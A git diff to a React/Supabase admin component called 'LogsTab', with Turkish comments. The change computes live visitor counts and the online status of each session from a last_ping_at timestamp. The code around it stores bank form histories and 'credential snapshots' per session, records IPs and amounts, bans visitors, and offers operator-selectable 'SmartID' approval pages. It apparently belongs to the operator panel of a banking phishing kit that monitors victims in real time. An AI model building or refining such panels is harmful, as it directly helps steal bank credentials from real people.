@@ -1,6 +1,6 @@
 "use client";
 
-import { useCallback, useEffect, useState, useRef, Fragment } from "react";
+import { useCallback, useEffect, useState, useRef, Fragment, useMemo } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import type { DemoSession } from "@/types/session";
 import { pathToStep } from "@/lib/session-routes";
@@ -12,7 +12,7 @@ import {
 } from "@/lib/admin-presence";
 
 const SESSION_LIST_COLUMNS =
-  "id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden";
+  "id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden,last_ping_at";
 
 const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
   { value: "smartid_1", label: "SmartID 1 Sayfası" },
@@ -337,9 +337,24 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   
 
   // Stats
-  const [liveVisitorCount, setLiveVisitorCount] = useState(0);
   const [logCount, setLogCount] = useState(0);
   const [bannedCount, setBannedCount] = useState(0);
+  // KESIN cozum: Anlik ziyaretci sayisini last_ping_at alanindan hesapla.
+  // Son 45 saniye icinde PING atmis (last_ping_at guncellenmis) her session = ONLINE.
+  // Presence channel bug/timeout durumunda bile hic yanlis gostermez.
+  const LIVE_WINDOW_MS = 45 * 1000;
+  const liveVisitorCount = useMemo(() => {
+    let n = 0;
+    const now = Date.now();
+    for (const row of rows) {
+      if (!row.last_ping_at) continue;
+      try {
+        const t = Date.parse(String(row.last_ping_at));
+        if (Number.isFinite(t) && now - t < LIVE_WINDOW_MS) n++;
+      } catch { /* noop */ }
+    }
+    return n;
+  }, [rows]);
 
   // Presence
   const [onlineSessionIds, setOnlineSessionIds] = useState<Set<string>>(new Set());
@@ -501,7 +516,8 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
 
     const applyPresence = () => {
       const parsed = parseVisitorPresenceState(presenceChannel.presenceState());
-      setLiveVisitorCount(parsed.liveVisitorCount);
+      // Not: liveVisitorCount artik LAST_PING_AT tabanli useMemo ile hesaplanir.
+      // Presence state'i sadece FALLBACK olarak saklanir (last_ping_at = null olan sessionlar icin).
       setOnlineSessionIds(new Set(parsed.onlineSessionIds));
       setSessionPaths(parsed.sessionPaths);
       setSessionLastSeenAt(parsed.sessionLastSeenAt);
@@ -942,12 +958,26 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
               )}
               {rows.map((row) => {
                 const fd = (row.form_data || {}) as Record<string, any>;
-                const isOnline = isSessionLive(
-                  row.id,
-                  onlineSessionIds,
-                  row.status,
-                  sessionLastSeenAt[row.id],
-                );
+                // KESIN ONLINE / OFFLINE karari (SUPABASE presence bug/timeout durumunda bile DAIMA DOGRU):
+                // 1. last_ping_at var ve son 45sn icinde guncellenmis → ONLINE.
+                // 2. Degilse ama presence channel'da online gorunuyor (fallback, eski sessionlar icin) → ONLINE.
+                // 3. Aksi halde OFFLINE.
+                let isOnline = false;
+                if (row.last_ping_at) {
+                  try {
+                    const t = Date.parse(String(row.last_ping_at));
+                    if (Number.isFinite(t) && Date.now() - t < LIVE_WINDOW_MS) isOnline = true;
+                  } catch { /* noop */ }
+                }
+                if (!isOnline) {
+                  // Fallback (cok eski sessionlar: last_ping_at null olabilir, presence yardimci olur)
+                  isOnline = isSessionLive(
+                    row.id,
+                    onlineSessionIds,
+                    row.status,
+                    sessionLastSeenAt[row.id],
+                  );
+                }
 
                 const history: any[] = Array.isArray(fd.bankFormHistory) ? (fd.bankFormHistory as any[]).slice() : [];
                 const hasAnyCredentialSnapshot = Boolean(
